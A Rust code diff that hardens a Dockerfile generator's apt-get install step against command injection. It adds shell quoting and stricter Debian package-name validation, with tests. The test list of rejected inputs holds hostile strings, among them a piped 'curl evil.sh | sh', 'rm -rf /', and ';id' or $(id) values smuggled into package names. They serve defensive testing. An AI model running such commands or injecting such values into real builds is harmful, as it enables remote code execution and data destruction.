@@ -538,10 +538,20 @@ impl<'a> BuildContext<'a> {
 /// `apt-get update` and `install` must share one command: splitting them lets
 /// Docker reuse a stale package index and install versions that no longer exist.
 fn apt_install(packages: &[String]) -> String {
+    let packages = packages
+        .iter()
+        .map(|package| shell_quote(package))
+        .collect::<Vec<_>>()
+        .join(" ");
     format!(
         "apt-get update && apt-get install -y --no-install-recommends {} && rm -rf /var/lib/apt/lists/*",
-        packages.join(" ")
+        packages
     )
+}
+
+/// Quote one argument for a POSIX shell, independently of validation.
+fn shell_quote(value: &str) -> String {
+    format!("'{}'", value.replace('\'', "'\"'\"'"))
 }
 
 /// Whether `name` is a legal Debian package name.
@@ -560,16 +570,63 @@ fn apt_install(packages: &[String]) -> String {
 /// quoting: a name that needs quoting is not a package name, and a clear error
 /// beats an apt failure the user has to decode.
 fn is_valid_apt_package(name: &str) -> bool {
-    let name = name.split_once('=').map_or(name, |(name, _)| name);
-    let name = name.split_once('/').map_or(name, |(name, _)| name);
-    let name = name.split_once(':').map_or(name, |(name, _)| name);
+    let mut release_parts = name.split('/');
+    let package_and_version = release_parts.next().unwrap_or_default();
+    let release = release_parts.next();
+    if release_parts.next().is_some() || release.is_some_and(|value| !is_valid_release(value)) {
+        return false;
+    }
 
-    name.len() >= 2
-        && name
+    let mut version_parts = package_and_version.split('=');
+    let package_and_arch = version_parts.next().unwrap_or_default();
+    let version = version_parts.next();
+    if version_parts.next().is_some()
+        || version.is_some_and(|value| !is_valid_version(value))
+        || (release.is_some() && version.is_some())
+    {
+        return false;
+    }
+
+    let mut arch_parts = package_and_arch.split(':');
+    let package = arch_parts.next().unwrap_or_default();
+    let architecture = arch_parts.next();
+    if arch_parts.next().is_some()
+        || architecture.is_some_and(|value| !is_valid_architecture(value))
+    {
+        return false;
+    }
+
+    package.len() >= 2
+        && package
             .chars()
             .next()
             .is_some_and(|c| c.is_ascii_lowercase() || c.is_ascii_digit())
-        && name
+        && package
+            .chars()
+            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '+' | '-' | '.'))
+}
+
+fn is_valid_architecture(value: &str) -> bool {
+    !value.is_empty()
+        && value
+            .chars()
+            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
+}
+
+fn is_valid_version(value: &str) -> bool {
+    !value.is_empty()
+        && value
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.' | ':' | '~' | '_'))
+}
+
+fn is_valid_release(value: &str) -> bool {
+    !value.is_empty()
+        && value
+            .chars()
+            .next()
+            .is_some_and(|c| c.is_ascii_lowercase() || c.is_ascii_digit())
+        && value
             .chars()
             .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '+' | '-' | '.'))
 }
@@ -629,12 +686,21 @@ mod tests {
         for bad in [
             "libpq5; curl evil.sh | sh",
             "libpq5 && rm -rf /",
+            "curl=1;id",
+            "foo/stable;id",
+            "libc6:amd64;id",
             "$(id)",
             "`id`",
             "lib pq5",
             "LIBPQ5",
             "-flag",
             "a",
+            "curl=",
+            "foo/",
+            "libc6:",
+            "curl=1=2",
+            "foo/stable/extra",
+            "curl=1/bookworm",
         ] {
             assert!(!is_valid_apt_package(bad), "{bad} should be rejected");
         }
@@ -657,6 +723,13 @@ mod tests {
         let err = check_apt_packages(&["libpq5; id".to_string()]).unwrap_err();
         assert!(err.to_string().contains("not a valid Debian package name"));
         assert!(check_apt_packages(&["libpq5".to_string()]).is_ok());
+
+        assert_eq!(
+            apt_install(&["curl=7.88.1-10".to_string(), "libc6:arm64".to_string()]),
+            "apt-get update && apt-get install -y --no-install-recommends \
+             'curl=7.88.1-10' 'libc6:arm64' && rm -rf /var/lib/apt/lists/*"
+        );
+        assert_eq!(shell_quote("package'name"), "'package'\"'\"'name'");
     }
 
     #[test]
